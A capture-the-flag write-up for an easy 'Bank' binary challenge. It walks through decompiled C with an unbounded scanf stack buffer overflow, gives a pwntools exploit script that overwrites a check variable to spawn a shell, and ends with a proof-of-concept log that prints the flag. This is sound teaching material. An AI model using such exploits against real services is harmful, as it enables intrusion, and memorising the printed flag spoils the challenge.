# [__💲 Bank 💲__](#)

## Description: 

* You need to access some secret files inside the bank's server. Bypass the authentication and read the secret file.

## Objective: 

* Take advantage of *Bof* to overwrite the value of `check` and call `secret()`.

## Flag: :black_flag:
* `INSSEC{b4nk_4uth3nt1c4t10n_syst3m_f41l3d!}`

### Difficulty:
* Easy

## Challenge:

The interface looks like this:

```console
[*] Authentication required!
1. Insert credentials.
2. Leave.
> 1

Password: 
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[-] Wrong password!
[1]    84420 segmentation fault (core dumped)  ./bank
```

As we can see, there is a `SegFault` after some "A"s. That means there is a possible *BufferOverflow*.

We run a `checksec` to verify this:

```sh
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

**Canary** is disabled, so *Bof* will be even easier now.

Let's open a disassembler to analyze the program.

### Disassembly 

We start from `main()`:

```c
undefined8 main(void)

{
  int local_c;
  
  setup();
  local_c = 0;
  printf("\x1b[1;36m");
  printstr("\n[*] Authentication required!\n1. Insert credentials.\n2. Leave.\n> ");
  __isoc99_scanf(&DAT_00100c82,&local_c);
  if (local_c == 1) {
    bank();
  }
  else {
    printf("\x1b[1;31m");
  }
  printstr("\nExiting..\n");
  return 0;
}
```

We see that there is a call to `bank()`.

### bank()

```c
void bank(void)

{
  undefined local_38 [44];
  int local_c;
  
  local_c = -0x21524542;
  printf("\nPassword: \n> ");
  __isoc99_scanf(&DAT_00100c13,local_38);
  if (local_c == -0x35014111) {
    secret();
  }
  else {
    printf("\x1b[1;31m");
  }
  puts("\n[-] Wrong password!");
  return;
}
```

We see that there is a *bof* at `scanf`, that we can take advantage of. The buffer is 44 bytes and `scanf` reads unlimited bytes.

The variable `local_c` is after our buffer (`local_38`). That means if we fill the buffer with 44 bytes of junk, the next 8 bytes will overwrite `local_c`.

What we need to do:

* Overflow the buffer and change the value of `local_c` in order to call `secret`.

`secret()`:

```c
void secret(void)

{
  printf("\x1b[1;32m");
  printstr("\n[+] Congratulations!");
  puts(&DAT_00100bf6);
  system("/bin/sh");
  return;
}
```

### Exploit 📜

```python
#!/usr/bin/python3.8
from pwn import *

ip = '172.17.0.1' # change this
port = 1337 # change this
fname = './bank'

LOCAL = False

if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

ru = lambda x : r.recvuntil(x)
sla = lambda x,y : r.sendlineafter(x,y)
inter = lambda : r.interactive()

def pwn():
	junk = b'i'*44
	payload = junk + p64(0xcafebeef)
	sla('>', '1')
	sla('>', payload)
	inter()

if __name__ == '__main__':
	pwn()
```

### PoC 🏁

```console
[+] Opening connection to 172.17.0.1 on port 1337: Done
[*] Switching to interactive mode
[+] Congratulations! 🎉
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ cat flag.txt
INSSEC{b4nk_4uth3nt1c4t10n_syst3m_f41l3d!}
```
